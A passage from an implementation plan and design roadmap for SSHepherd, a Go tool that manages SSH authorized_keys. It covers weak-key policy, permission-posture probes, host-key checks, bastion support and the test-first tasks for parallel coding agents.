- **Load-time behavior follows D29** (review panel, product-ux: a weak key must not blind a scheduled audit). A weak key is a **policy conflict** returned by `config.Parse` in `Conflicts()`, not a load error: `audit` loads the manifest and reports it as critical (exit 2) on the servers that grant it; `apply` refuses those servers (installs nothing there) and plans the rest; `revoke` and `rotate` load and save normally, so the remediation (`rotate alice --old <dsa> --new <ed25519>`, `revoke --key <dsa>`) always works; `validate` (D25) and manifest-saving commands that would **add** a weak key refuse it (exit 3). A passed `expiry-time` is always a `Warning` only (`config.go:126`), with a clock seam (`var now = time.Now`). The question text says plainly: "a manifest that loads today keeps loading; audit starts reporting its weak keys as critical".
- `adopt` and `import --merge`: on-server or `.pub` keys that are weak are **skipped with a warning**. Emitting them would produce a manifest that fails to load. Audit keeps showing them as UNAUTHORIZED, which is the right pressure.
- Audit: unauthorized rows get ` · WEAK (dsa)`. Present rows whose desired `expiry-time` has passed get ` · EXPIRED`. Both are informational, with **no exit change**, because the server matches the manifest. The exception is the operator case from Q2: an expired operator line → critical. JSON gets `"key_issues": ["dsa"|"rsa_under_2048"|"expired"]` on keys (omitempty).

---

#### What the spec doc must contain (decision-ready checklist)

1. A Decisions table (D14–D19) with the owner's answers, plus the corrected D16 wording and why.
2. **Exit-code table changes** — rows for the one shared exit-code table that D28 fixes (Block 1); this spec adds audit rows only:
   | Code | Added cases |
   |---|---|
   | 1 | posture `symlink`/`foreign_owner`/`group_writable`; posture-probe failure (`remote`) |
   | 2 | posture `world_writable`; operator key present but `cert_only`/`expired`; `host_key_type_changed` |
   | 3 | `validate` and manifest-saving commands only: the manifest holds a DSA or RSA<2048 key (a D29 policy conflict). audit reports it as critical (2) instead; apply refuses the servers that grant it. |
3. **JSON (schema stays 1; every field additive-optional, omitempty):** server `posture: [{path, issue, mode, uid}]`; server `critical_reasons: ["operator_missing"|"operator_cannot_log_in"|"world_writable"]` (so monitoring can tell why it got exit 2); key `cannot_log_in`, `key_issues`, and `operator` (now also on critical present keys); summary unchanged except that `host_key_alerts` counts the new kind. New `error_kind` value: `host_key_type_changed`. Server `critical_reasons` also gains `"policy_conflict"` (D29, weak key).
4. The text-report wording for each new row and note. Copy it into goldens once implemented; never hand-write it in the README.
5. The remote-script contract: `PostureCmdFor`, the record grammar, a cap of 64 records and 1 MiB, and fail-closed parsing.
6. README sections touched: Why (line 37), Status, audit Drift classes (~345) and flag table (325), adopt/apply/revoke/rotate flag tables (`--offer-all-keys`), Operator users (239), Per-server `authorized_keys_file` (255-272), Validation rules (274), Exit codes (1340), Authentication (1144, key offering), Safety model (1352, connection posture). Plus CLAUDE.md Core capabilities and Status.
7. Files touched by the implementation: `internal/fleet/{errors,read}.go`; `internal/sshconn/{sshconn,knownhosts,hostkey,connect,credentials}.go`; `internal/sshread/sshread.go`; `internal/sshwrite/sshwrite.go` (walk moved out, script bytes unchanged); `internal/audit/{audit,report,json}.go` plus testdata; `internal/authkeys/{options,policy}.go`; `internal/config/config.go`; `internal/apply/plan.go` (`certOnly` → `authkeys.CertOnly`); `internal/adopt/adopt.go`; `cmd/sshepherd/{audit,adopt,apply,revoke,rotate,editrun,keyarg,import}.go`.
8. Out of scope: listed explicitly (below).

---

#### Implementation outline (after approval and after P14/W3)

Execution: **Task 0 (integrator, serial)**, then **Wave A (four parallel agents, disjoint files)**, then **Wave B (three parallel agents)**, then the integrator (`make check` + `make integration`, README/CLAUDE.md, one commit), then an independent verifier, then a repair pass. Agents work in worktrees and never commit. Run Go as `GOTOOLCHAIN=go1.27.3 …`, and use `rtk proxy go test …` when exact lines matter.

**Task 0 (integrator): shared types, to avoid a write conflict on `internal/fleet`.**
Files: `internal/fleet/errors.go`, `internal/fleet/read.go`. Add the constant `ErrorKindHostKeyTypeChanged = "host_key_type_changed"`, the `PostureIssue` type, and `ReadResult.Posture`. Test first: in `fleet/errors_test.go`, assert that the string values are the wire contract. Run `go test ./internal/fleet/`, which fails because the symbols are missing, then implement and run it again.

**Wave A: four agents, disjoint files.**

- **A1: authkeys policy** (`internal/authkeys/policy.go` new, `policy_test.go` new, `options.go`, `authkeys.go`, `authkeys_test.go`).
  Failing tests first:
  ```go
  func TestStrengthIssue(t *testing.T) {
      for _, tc := range []struct{ name, line, want string }{
          {"ed25519 ok", ed25519Line, ""},
          {"rsa 2048 ok", rsaLine(t, 2048), ""},
          {"rsa 1024 weak", rsaLine(t, 1024), "rsa_under_2048"},
          {"dsa weak", dsaLine, "dsa"},
      } { t.Run(tc.name, func(t *testing.T) {
          k, err := ParseLine(tc.line); if err != nil { t.Fatal(err) }
          if k.Weak != tc.want { t.Fatalf("Weak = %q, want %q", k.Weak, tc.want) }
      })}
  }
  func TestCertOnly(t *testing.T) { /* cert-authority, CERT-AUTHORITY, principals="a", restrict → false */ }
  func TestExpiryPassed(t *testing.T) { /* moved cases from keyarg_test.go: 8/12/14 digits, Z suffix, bad length error */ }
  ```
  Use `rsaLine` to generate a key with `rsa.GenerateKey` at the bit size (1024 needs `GODEBUG=rsa1024min=0` set via `t.Setenv`). `dsaLine` is a fixed testdata string. Run `go test ./internal/authkeys/ -run 'Strength|CertOnly|Expiry'`: FAIL. Implement, then PASS. Add a fuzz seed: the `ParseLine` fuzz corpus gains one DSA line.
- **A2: posture probe** (`internal/sshconn/sshconn.go`, `sshconn_test.go`, `posture.go` new, `posture_test.go` new; `internal/sshwrite/sshwrite.go`; `internal/sshread/sshread.go`, `hermetic_test.go`, `integration_test.go`).
  Failing tests first:
  1. `TestWriteCmdUnchanged`: a golden of `writeCmdFor` from before the move, to prove the bytes are identical.
  2. `TestFinishPosture` table: clean output → nil; `SSHEPHERD-POSTURE drwxrwxrwx 1000 /home/u/.ssh` → `world_writable`; `-rw-rw-r--` → `group_writable`; a foreign uid → `foreign_owner`; `lrwx…` → `symlink`; a garbage line → `ErrorKindRemote`; 65 records → error; `SSHEPHERD-KEYS2 1` → keys2 set.
  3. A hermetic test using `sshtest.ShellHandler(home)`: `os.Chmod(home+"/.ssh", 0o777)`, run a read, and expect `Posture[0].Issue == "world_writable"`; then a `0o775` case → `group_writable`; a clean `0o700` case → empty.
  4. Integration (`//go:build integration`, real sshd container): chmod `~/.ssh` to 0775 and expect drift.
  Commands: `go test ./internal/sshconn/ ./internal/sshread/ ./internal/sshwrite/` (FAIL, then PASS); `make integration`.
- **A3: host-key type tier** (`internal/sshconn/hostkey.go`, `knownhosts_test.go`, `connect_test.go` host-key cases only).
  Failing test: `known_hosts` records ed25519, and the `sshtest` server serves only ECDSA. Expect `fleet.ErrorKindOf(err) == ErrorKindHostKeyTypeChanged`. A second case records only an unsupported type and expects `host_key_type_unrecorded`. Run `go test ./internal/sshconn/ -run HostKeyType`.
- **A4: key offering** (`internal/sshconn/connect.go`, `credentials.go`, `connect_creds_test.go`).
  Failing table tests on `orderSigners(signers, prefer, only, offerAll)`: granted+other with `offerAll=false` → only the granted key; with `offerAll=true` → today's order; a cert whose `Key` is granted → offered; a cert signed by a granted CA → offered; no granted key held → every held key is offered and one warning is logged (assert the warning text and that the login succeeds with a non-granted held key). Also a hermetic test that records the public keys the server was queried with: with 3 keys loaded and 1 granted, only 1 query is seen. Run `go test ./internal/sshconn/ -run 'Offer|orderSigners'`.

A3 and A4 both live in `internal/sshconn` but touch disjoint files. Their test files are `knownhosts_test.go`/`connect_test.go` (A3) and `connect_creds_test.go` (A4). If a merge conflict shows up in `connect_test.go`, A4 adds a new `offer_test.go` instead.

**Wave B: three agents (needs Wave A).**

- **B1: audit grading** (`internal/audit/audit.go`, `report.go`, `json.go`, `errors.go`, their `_test.go` files, and `testdata/report_posture.golden(.json)`, `report_operator_certonly.golden(.json)`, `report_key_issues.golden(.json)`, `report_error_kinds.golden(.json)` updated).
  Failing tests:
  ```go
  func TestCriticalOperatorCertOnly(t *testing.T) {
      cfg := mustCfg(t, operatorManifest)                  // op: operator, plain key
      r := auditWith(t, cfg, "cert-authority "+opKeyLine)  // installed as CA line
      if got := statusOf(cfg, r); got != statusCritical { t.Fatalf("status %s, want critical", got) }
      if ExitCode(cfg, []ServerResult{r}) != 2 { t.Fatal("want exit 2") }
  }
  // + manifest declares the line cert-authority too → compliant, exit 0
  // + Posture world_writable → critical/2; group_writable → drift/1
  // + Err kind host_key_type_changed → exit 2 and host_key_alerts 1
  // + present key with passed desired expiry-time → status unchanged, row shows EXPIRED
  ```
  Regenerate goldens with `-update`, then **read them back by eye** against the spec's wording. Run `go test ./internal/audit/`.
- **B2: config and write-path rules** (`internal/config/config.go`, `config_test.go`; `internal/apply/plan.go`, `plan_test.go`; `internal/adopt/adopt.go`, `adopt_test.go`).
  Failing tests: `Parse` with a DSA user → no error, and `Conflicts()` holds `user "old" key 1: dsa keys are rejected` (D29); `audit` on a server granting it → critical (exit 2); `apply` plans that server as refused; an `expiry-time="20200101"` key → warning `has expired`, using `now` pinned in the test; adopt on a server holding a 1024-bit RSA key → key skipped with warning `key SHA256:… on web-1: rsa_under_2048 key not adopted`; `apply.Survivors` is unchanged through `authkeys.CertOnly` (existing tests stay green). Run `go test ./internal/config/ ./internal/apply/ ./internal/adopt/`.
- **B3: CLI wiring** (`cmd/sshepherd/{audit,adopt,apply,revoke,rotate,editrun,keyarg,import}.go`, matching `_test.go` files, help goldens).
  Failing tests: `--offer-all-keys` appears on all five commands with the right defaults (in the help golden); `rotate` loads a manifest with a DSA user and replaces it (an integration-free hermetic test), while `apply` on the same manifest exits 3; `keyarg` uses `authkeys.ExpiryPassed` (the old tests move). Run `go test ./cmd/sshepherd/`.

**Integrator:**
1. Apply the diffs in the order A1, A2, A3, A4, B1, B2, B3.
2. Run `make check` (it ends in the coverage gate) and `make integration`. The E2E gains one posture step: chmod 0775 on `~/.ssh` in a container → `audit` exits 1 with `group_writable`, `apply` refuses with 48, fix the mode → exit 0.
3. Update every README section listed in checklist item 6, with sample output copied from the new goldens. Update CLAUDE.md Status.
4. Make one commit.
5. A **verifier** (new agent) re-checks each exit-table row against a real run, and re-checks the hostile-output parsing of `FinishPosture`.
6. A repair pass fixes whatever the verifier finds.

**Risks to spell out in the spec:**
- The restricted key offer breaks setups where the working key is held but another held key is the granted one. Mitigations: the offer-all fallback when no granted key is held, the warning, and `--offer-all-keys`.
- The posture probe needs `ls -ldn`, `dirname` and `cd -P`, which are already required by the write path. Busybox, dash and bash are covered by integration.
- Weak-key rejection makes manifests that load today fail to load. The release note and README must say so, and `rotate`/`revoke` remain the way out.
- `host_key_type_changed` may page on a legitimate host re-key that dropped every recorded type. That is intended: it is a re-key and needs a human.

#### Acceptance

- The spec file exists at `docs/superpowers/specs/2026-11-08-audit-trust-posture-design.md`. It has a Decisions table recording the owner's answers to D14–D19 (with the D16 options as corrected above), the exit-code table, the JSON field list, the new `error_kind` values, the README section list, the file list, and an Out of scope section.
- `git status --porcelain` shows only that new file. `make check` still passes, since the change is docs-only (gitleaks, misspell).
- After implementation (a later wave): `GOTOOLCHAIN=go1.27.3 make check` and `make integration` pass. `go test ./internal/audit/ ./internal/sshconn/ ./internal/sshread/ ./internal/authkeys/ ./internal/config/ ./cmd/sshepherd/` pass with the new tests. The goldens are regenerated and reviewed. The README exit table matches `audit.ExitCode`.

#### Out of scope

- **On-hold (owner, 2026-11-07):** key generation and **scheduled rotation**, so no `added:` date, no key-age limit and no "overdue for rotation" in audit (part of PRD-10's suggested fix is excluded for this reason). Also out: prune (the deeper PRD-9 probe only **reports** other accounts' keys and never removes them), `apply --force`, `import --prefer`, move-key, and apply wipe/empty-server mode.
- A configurable `policy:` block in the manifest, **unless** the owner picks D19 option 2 (then it is in scope and this spec designs it).
- Treating an added `command=`/`from=` on an operator line as critical (it stays options drift at exit 1).
- The design of the deeper PRD-9 probe (`sshd -T`, other accounts). It gets its own later spec. Only the README narrowing lands soon.
- Bastions/ProxyJump (D23, P10) and the operator scope split `protected:` (D21, P10).

---

### P10 — Spec: access model and fleet reach (groups/tags, operator scope, per-grant options, bastions, co-management, new commands, flag names)

> **Program notes (master plan, revised by the review panel):** Spec only, and a **roadmap** rather than a remediation: it covers 8 finding IDs by design, but its spec agent runs **after W4** (not in W1), and its questions are asked after W4, ordered by value: **D25 → D23 → D24 → D26 → D21 → D20 (tags) → D20b (groups) → D22**. D20 is split into tags (fixes PRD-5) and groups (PRD-4), as separate questions and slices; the D20/D20b sections must define how a D1a access tombstone (user + servers) applies to group- and tag-derived grants. Sub-questions are numbered (D20a, D21a, D24a, D25a, D25b) and listed in the master decision table. UX-7's minimal fix (the "keeps access to N other servers" line) already landed in W1 (P06 Task 7b).

- **Kind:** spec (documentation only; no Go, README or golden changes in this package)
- **Wave:** after W4 (spec only; it reads the post-W4 tree, so file:line citations match the final layout).
- **Depends on:** P04-impl (W4) for the `revoked:`/`serial:` schema it must compose with. It does not edit P04's file.
- **Files owned (exclusive):** `docs/superpowers/specs/2026-11-08-access-model-roadmap-design.md` (new). Nothing else.
- **Executor:** one spec agent in a worktree, run as a one-lane spec workflow after W4 (`kind: 'spec'`). Its integrator commits the file on master. No commit by the agent.

#### Findings covered

| ID | Sev | One line | Decision |
|---|---|---|---|
| PRD-4 | MED | Access is flat (one `user` and literal servers). YAML anchors, the only reuse tool, make revoke and rotate refuse (`manifest.go:173-174`) | D20 |
| PRD-5 | LOW | `servers: ["*"]` is the only selector and spans every account on every host, including root (`config.go:460-465`) | D20 |
| PRD-7 | MED | `operator: true` ties "protected key" to "on every server", and the operator grant ignores `except:` (`config.go:476-491`) | D21 |
| PRD-6 | LOW | Options belong to the key line, and fingerprints are unique (`config.go:152-155`, `177-197`), so one key cannot carry different restrictions on different servers | D22 |
| PRD-3 | MED | No bastion support. Every server is dialed directly (`connect.go:190-201`, README:112-115) | D23 |
| PRD-8 | MED | Full-file ownership has no co-management mode, so it fights cloud guest agents and gitlab-shell/Gitea (`plan.go:165-215`, README:1352-1356) | D24 |
| PRD-11 | LOW | No offline `validate` command and no `audit --server` (`run.go:220-225`, `audit.go:113-119`). No `grant` command | D25 |
| UX-7 | LOW | `--operator`, `--merge` and `--server` mean different things on different commands (`import.go:431-434`, `adopt.go:323`, `editrun.go:32`, `revoke.go:72`, `apply.go:124`) | D26 |

#### What this package produces

One roadmap-style design doc with **one self-contained section per decision (D20–D26)**. Each section must be liftable unchanged into its own later slice spec. The doc decides nothing by itself. Its header says `Status: Proposed — awaiting owner decisions D20–D26`, and every section ends with an "Owner decision" box that quotes the D-question exactly as it appears in the program's decision list, gives the options and the recommendation, and leaves the choice blank. The owner answers **one decision at a time** in short, plain English. Suggested order, cheapest and most independent first: D25 → D26 → D20 → D21 → D23 → D24 → D22.

Each section has these subsections, in this order:
1. **Problem** (finding ID, cited code, one real scenario)
2. **Options** (matching the D-options)
3. **Recommended design**: schema change, validation rules, semantics, and the edge cases listed below
4. **Interaction with the on-hold list**: what it must not become
5. **README impact** (which README sections change)
6. **Touched packages / files**
7. **Tests** (kinds: unit, golden, fuzz, hermetic, integration, E2E)
8. **Owner decision** box

---

#### Task 1 — Read the grounding code (no writes)

The agent reads these files before writing. The spec must cite file:line from them.

- `internal/config/config.go`: `User` (22-28), `Server` (31-45), `Access` (49-53), `target` dedup (257-302), the `"*"` reservation (279-281), `validateAccess` (391-429), `expandServers` (435-470), `DesiredFor` (478-492), `Covers` (527-540), `ExceptCarveOut` (551-561)
- `internal/manifest/manifest.go`: `checkTopLevelKeys` (143-159, an allow-list of `users|servers|access`), `checkNodeShapes` (172-197, the anchor refusal), `userNode`/`serverNode`/`accessNode` (342-379)
- `internal/manifest/edit.go`: `RemoveUser` (23-44, matches `access[].user` only), `RemoveAccess`/`trimEntry`/`exceptServers` (258-377, where `except:` is wildcard-only)
- `cmd/sshepherd/manifest_out.go` (18-44): `serverOut`/`userOut`/`accessOut`/`manifestOut`, the non-merge generator schema
- `cmd/sshepherd/adopt.go:50-61` (regenerates `access:` from `cfg.Access`) and `cmd/sshepherd/revoke.go:250` (`NoGrantsLeft` checks `a.User` only) and `revoke.go:260-275` (`accessProblems`, operator refusal)
- `cmd/sshepherd/editrun.go:85-100` (`operatorGate`) and `editrun.go:28-35` (`--operator` bool)
- `internal/audit/report.go:120` and `:262` (`criticalDrift`), `internal/audit/json.go:211`, `internal/apply/json.go:341,359`, `internal/reconcile/reconcile.go:211-272,383`: every place where `u.Operator` means "protected"
- `internal/apply/plan.go:153-240` (`planOne`: the empty-desired "refusing to wipe" rule at 169-186, the unparseable refusal at 189-195, the byte-exact compare at 212-216) and `plan.go:246-255` (`desiredEntries`). Also `internal/apply/affected.go` (render diff, "same servers" precondition)
- `internal/authkeys/render.go:14` (`ManagedHeader`) and `:54` (`Render`), and `internal/authkeys/authkeys.go:174-209` (`Diff`)
- `internal/sshconn/connect.go:137-234` (`ConnectWith`: one choke point used by `sshread.go:163` and `sshwrite.go:444`; raw-socket `SetDeadline` at 205; dial hint at 199-201)
- `internal/sshconn/sshtest/sshtest.go:318` (rejects every channel type except `session`, so there is no `direct-tcpip` yet)
- `golang.org/x/crypto@v0.58.0/ssh/tcpip.go:380`: `(*ssh.Client).DialContext` exists, so a hop needs no new dependency
- `internal/sshcfg/sshcfg.go:20-23,212-271` (`Host.Proxy` = first ProxyJump/ProxyCommand) and `cmd/sshepherd/import.go:181-189` (`warnProxies`)
- `cmd/sshepherd/audit.go:60-112` and `internal/audit/audit.go:169-199`: `audit.Options.Servers` already exists, so `audit --server` is wiring only. Also `cmd/sshepherd/apply.go:357-385` (`selectServers`)
- `cmd/sshepherd/help_readme_test.go:72-73`: hidden flags are skipped, so deprecated aliases do not break the README flag-table test
- Prior deferrals to supersede by name: `specs/2026-07-10-operator-users-wildcard-access-design.md:60`, `specs/2026-07-06-audit-slice-design.md:45`, `specs/2026-10-16-review-hardening-design.md:112-115`, `specs/2026-11-07-revoke-server-keep-old-design.md` decision 3 (operators refused by `--server`)

Verify: `git -C /Users/javad/w/personal/SSHepherd status --porcelain` stays empty.

#### Task 2 — Write the spec

Create `docs/superpowers/specs/2026-11-08-access-model-roadmap-design.md` with the frame below and then the seven sections. The content of each section must cover at least what follows. The agent writes the prose and keeps every claim tied to a cited line.

**Frame**
- Title `# Design roadmap: access model and fleet reach`, Date 2026-11-08, Status Proposed, Findings PRD-3/4/5/6/7/8/11 and UX-7.
- "Out of scope (owner hold, 2026-11-07)": prune, `apply --force`, `import --prefer`, key generation and scheduled rotation, move-key, and apply wipe/empty-server mode. Each section that comes near one says why it stays clear.
- "Schema-change ordering": D1 `revoked:` and D4 `serial:` (P04 spec), plus D20 `groups:`, all add top-level keys. Each needs the same three edits: the struct in `config.go`, the allow-list in `manifest.go:153-154`, and the `manifestOut` struct in `manifest_out.go:41-44`. The P12 `schema_roundtrip_test.go` (new in wave 2) is the guard that catches a missed `manifestOut` field. So these slices are **sequential on those three files**.

##### D20 (tags, PRD-5) and D20b (groups, PRD-4) — two questions, two slices

The section is written as two liftable parts: **tags** (`Server.Tags`, `@tag` selectors, `except:` with `@tag`) is D20 / slice S3a, and **groups** (`groups:`, `Access.Group`) is D20b / slice S3b. Each part must state how a D1a access tombstone (`revoked: [{user, servers}]`) applies: a tombstone for user U on server S blocks U's access to S even when it comes from a `@tag` or a group (it acts as an implicit `except:` for U), and adopt/import never re-extend it. The combined schema below shows both parts.

Recommended schema:
```yaml
groups:
  - name: web-team
    description: docs only
    members: [alice, bob]
servers:
  - name: web-1
    host: 10.0.1.5
    user: deploy
    tags: [prod, web]
access:
  - group: web-team          # exactly one of user: / group:
    servers: ["@web"]        # "@tag" selects every server carrying the tag
  - user: carol
    servers: ["@prod", db-1] # selectors and names mix (union)
    except: [web-3]          # now valid with "*" or any "@tag"
```
Go shape: `type Group struct{ Name, Description string; Members []string }`, `Config.Groups []Group`, `Server.Tags []string`, `Access.Group string`.

Validation rules the spec must fix:
- Exactly one of `user:`/`group:` per entry. Group names are unique and every member must be a known user. A duplicate member is an error.
- Tag names match `^[a-z0-9][a-z0-9._-]{0,62}$`. Server names that start with `@` are reserved (the same pattern as `*` at `config.go:279-281`).
- An `@tag` that matches no server is an error (typo guard, like an unknown server name).
- `except:` is allowed whenever the list contains `*` or at least one `@tag`, and each except name must be a known server. `*` must still be the only entry.
- Empty group. **Recommend:** valid but warned (`Config.Warnings`), so that `revoke` of the last member never breaks the manifest. Its grants add nothing.
- Expansion happens in `validateAccess`/`expandServers`, so `c.grants`, `DesiredFor` and therefore `apply.Affected` (a render diff) do not change. **Correction the spec must state:** `Covers` (527-540), `ExceptCarveOut` (551-561) and `revoke.go:250` scan raw `Access` entries by `a.User`. They must move to a shared `entryApplies(a, user)` / `entryCovers(a, server)` helper. A `@tag` never covers a server that is not in the manifest yet (it has no tags), so `reconcile` stays conservative.
- **D20a** (sub-question, asked right after D20): also add a load **warning** when a non-operator `servers: ["*"]` covers an entry with `user: root`? Recommend yes. It is cheap and needs no schema.

Manifest editor (`internal/manifest/edit.go`):
- `checkTopLevelKeys` accepts `groups`.
- `RemoveUser` also drops the name from every `groups[].members` and reports the count in `UserRemoval.Groups`.
- `RemoveAccess(user, servers)` on a grant that comes only from a group refuses with exit 3: "alice's access to web-1 comes from group web-team; remove her from the group or trim the group's grant".
- Trimming an `@tag` grant appends to `except:`, the same rule as for `*`.
- New `AddMember`/`RemoveMember` exist for the later `grant`. They are not exposed in this slice unless the owner asks.
- Non-merge `adopt` regenerates `access:` from `cfg.Access` (`adopt.go:50-61`), so `manifestOut` must carry `groups`, `tags` and `group`, or adopt silently drops them. This needs a test.

Tests:
- Unit, table-driven, in `config_test.go`: valid and invalid cases.
- **Equivalence property test:** for each fixture, the grouped/tagged manifest and its hand-flattened twin give identical `DesiredFor` for every server, and identical `apply.Affected`.
- `manifest` edit goldens: remove a user who is a group member, a refused trim of a group grant, a trimmed tag grant.
- Fuzz seeds with `groups:`/`tags:` in the existing config/manifest corpora.
- E2E: one group grant in the adopt → apply → revoke → audit loop.

README: the manifest-schema section (new groups and tags subsection), the wildcard section (the root-account warning), and the revoke `--server` paragraph (the group refusal).

Touched: `internal/config`, `internal/manifest`, `cmd/sshepherd/{manifest_out,adopt,revoke}.go`, `internal/reconcile` (only through `Covers`), README.

##### D21 — `protected: true` separate from fleet-wide reach (PRD-7)

Recommended semantics:
- `protected: true` gives CRITICAL-when-missing, the `--operator` acknowledgement and the "written first" order. It applies **only where the user's access entries grant it**.
- `operator: true` = protected plus an implicit `servers: ["*"]`. **But** if the operator user has its own wildcard entry, that entry and its `except:` *replace* the implicit grant. That one rule makes `except:` work without a second mechanism. Existing manifests (operators with no wildcard entry) render byte-identically. A golden must prove this.
- `config.User.IsProtected() bool { return u.Operator || u.Protected }`. Every protection site listed in Task 1 switches to it: `audit/report.go:120,262`, `audit/json.go:211` (adds JSON `protected` and keeps `operator`; schema stays 1 because the field is additive), `apply/json.go:341,359`, `editrun.go:95` (`operatorGate`), `revoke.go:267`, and `reconcile.go:211-272,383`. `DesiredFor` (478-492) emits protected-and-granted keys first, in users order. The `Covers` doc comment (523-526) is updated.
- `revoke --server` on a protected **non-operator** user is allowed with `--operator`. On an operator it stays refused, keeping decision 3 of the revoke-server spec, unless the owner opts in: **D21a** (asked right after D21; recommend: keep it refused).
- Lockout: an `except:` can take the management key off a server. The guard (`plan.go:377`) already refuses any write that leaves no held key, so the spec only has to note that the guard is the safety net.

Tests: config unit tests (operator with and without its own wildcard, protected plus explicit grant), audit CRITICAL goldens for a protected non-operator key, the JSON additive-field golden, revoke operator-gate tests, and an unchanged-render golden for today's operator manifests.

README: the Operator users section (239-247), the exit-code row for 2 ("missing operator **or protected** key"), and revoke/rotate `--operator`.

##### D22 — Per-grant `options:` (PRD-6). Recommendation: **not now**

Sketch it so the owner can see the cost:
- `access[].options: [...]` replaces the key line's options for the servers that entry grants. Two entries that grant the same user on the same server with different options is a load error.
- `DesiredFor` would then return per-server `authkeys.Key` copies with overridden `Options`. Audit options drift and `apply.Affected` follow automatically, because both consume `DesiredFor`/render.
- Depends on P05's option canonicalisation (`internal/authkeys/options.go`, wave 1), so it cannot start before that lands.
- Why defer: a second keypair works today, and the change touches the one key-identity invariant (fingerprint → one options set). A later spec can re-open it.

##### D23 — Bastions: per-server `via:` (PRD-3)

Schema: `servers[].via: <server-name>`. The bastion is a normal manifest server, so its own `authorized_keys` is audited and applied. Bastion access is access, and audit stays the complete "who can log in where" answer.

Validation:
- `via` names a known server, not itself. No cycles (DFS). Chain depth at most 3.
- The dedup `target` (`config.go:257-262`) gains the via chain, because `10.0.0.5:22` behind two bastions are two machines.

Transport, all in `ConnectWith` (`connect.go:137`), the single choke point for read, write and probe:
```go
// sketch for the spec, not final code
func (d *Dialer) dialTarget(ctx context.Context, srv config.Server, addr string) (net.Conn, func(), error) {
	if srv.Via == "" {
		c, err := (&net.Dialer{Timeout: d.DialTimeout}).DialContext(ctx, "tcp", addr)
		return c, func() {}, err
	}
	hopSrv, ok := d.ViaServer(srv.Via) // resolved from the validated config
	if !ok {
		return nil, nil, fmt.Errorf("via %q: unknown server", srv.Via)
	}
	hop, err := d.ConnectWith(ctx, hopSrv, ConnectOptions{}) // strict known_hosts on the hop too
	if err != nil {
		return nil, nil, fmt.Errorf("via %s: %w", srv.Via, err)
	}
	c, err := hop.Client.DialContext(ctx, "tcp", addr) // x/crypto ssh/tcpip.go:380
	if err != nil {
		_ = hop.Close()
		return nil, nil, fmt.Errorf("via %s: dial %s: %w", srv.Via, addr, err)
	}
	return c, func() { _ = hop.Close() }, nil
}
```
Decisions the spec must make, with recommendations:
- (a) **No hop pooling in the first slice.** `connect.go:205` installs a per-target deadline on the raw socket, so a shared hop would inherit one target's deadline. Use one hop connection per target connection, closed with the target `Conn`.
- (b) A per-bastion concurrency cap (default 8). sshd's `MaxStartups 10:30:100` drops connections at `--parallel 32`.
- (c) The host key of the inner hop is looked up by the target's `host`, as OpenSSH does. Two private hosts with the same IP behind different bastions then **fail closed** (strict mismatch, exit 2). A `host_key_alias:` field is deferred.
- (d) Apply write order: servers that are a `via` for others are written **after** their dependents (reverse topological order), so a bad bastion write cannot strand pending target writes.
- (e) Offered keys on the hop follow D17 (granted on the hop plus operators).
- (f) Audit: one unreachable bastion makes its dependents `unreachable` with the root cause `via bastion-eu: …`.
- Update the dial hint at `connect.go:199-201`.

Import: `Host.Proxy` = `ProxyJump a[,b]` maps to a `via:` chain when every hop resolves to an imported server (by alias, or by host+port+user). Otherwise import warns as today (`import.go:181-189`). `ProxyCommand` stays unsupported and keeps its warning.

Tests:
- sshtest gains `direct-tcpip` (today `sshtest.go:318` rejects it), with a hermetic hop-to-target test.
- Config cycle and depth tests.
- Hop host-key mismatch → exit 2 test.
- Import ProxyJump mapping table plus an `ssh -G` diff case.
- Integration: a docker bastion on two networks, with the target on the internal network only.
- E2E: audit and apply through the bastion.

README: Requirements "Direct reachability" (112-115) is rewritten, plus a new `via:` schema subsection, import's ProxyJump note, and a `--parallel` tuning note.

Touched: `internal/config`, `internal/sshconn/{connect.go,sshtest/sshtest.go}`, `internal/sshcfg`, `cmd/sshepherd/import.go`, `internal/apply/exec.go` (write order), `scripts/integration.sh`, README.

##### D24 — Co-managed accounts: per-server `preserve:` (PRD-8)

Schema:
```yaml
servers:
  - name: gitea
    host: git.example.com
    user: git
    preserve:
      - command: '/usr/local/bin/gitea --config=/etc/gitea/app.ini serv key-[0-9]+'
      - comment: 'google-ssh .*'
```
Rules:
- Each matcher has exactly one of `command:` (matches the `command="…"` option value) or `comment:` (matches the line comment).
- Go RE2, implicitly full-match `^(?:…)$`. Must compile, length ≤ 512, and must **not** match the empty string (rejects `.*`).
- A line whose fingerprint the manifest owns is always managed, never preserved (the manifest wins).
- Unparseable lines still refuse (`plan.go:189-195`).

Render: managed header, then desired keys, then a fixed marker line `# Preserved by SSHepherd (externally managed):`, then the preserved lines verbatim in on-server order. When `preserve:` is set, the header (`render.go:14`) says that preserved lines are kept. Byte-exact convergence still holds (`plan.go:212-216`). The existing CAS stops a race with the external tool.

On-hold boundary: the empty-desired rule (`plan.go:169-186`) stays. A server with no desired keys is **never written**. Preserved lines are not counted as unauthorized, so such a server becomes `converged` instead of `refused`. That is not a wipe mode.

Guard: preserved keys **never** count as surviving held keys (`plan.go:377`), because the external tool may delete them at any time.

Audit: `ServerResult.External []authkeys.Key`, a text row `~ externally managed (preserve)`, and JSON `keys.external`. Not drift (exit 0). Every external key is listed by fingerprint, so "who can log in" stays answerable.

adopt: lines that match `preserve` are not turned into users.

Rejected alternative: a managed block (`# BEGIN/# END`). Keys outside the block would be invisible to the model, audit could no longer state who has access, and the parser and render would need block awareness.

Security note: a `comment:` matcher lets anyone who can write that comment keep a key. The README must warn about this and prefer `command:` matchers. **D24a** (asked right after D24): allow `comment:` matchers at all? Recommend yes, with the warning, because GCP keys carry no forced command.

Tests: config validation table (empty-match, both fields, bad regex), apply plan goldens (preserved rows, converged-with-only-preserved, guard ignores preserved), audit text and JSON goldens, render golden, fuzz seed, integration (a gitlab-style `command=` line survives apply), E2E optional.

README: Safety model "Full-file rewrite" (1352-1356) gets the exception, plus a schema subsection and a co-managed-accounts recipe.

Touched: `internal/config`, `internal/authkeys/render.go`, `internal/audit`, `internal/apply/plan.go`, `internal/adopt`, `cmd/sshepherd/manifest_out.go`, README.

##### D25 — New commands: `validate` and `audit --server` now, `grant` later (PRD-11)

`sshepherd validate [--config FILE] [--known-hosts FILE] [--strict]`. It is offline and never dials.
1. `config.Load`: the same errors as every command, exit 3.
2. Print `Config.Warnings`.
3. `manifest.Load`: an `*UnsupportedError` becomes a warning, "revoke, rotate and --merge cannot edit this manifest: …".
4. When `--known-hosts` is given (default `~/.ssh/known_hosts`; missing file → warning), each server with no recorded host key becomes a warning. Use `KnownHosts.HostKeyAlgorithms(addr)` (`knownhosts.go:127`); an empty result means not recorded.
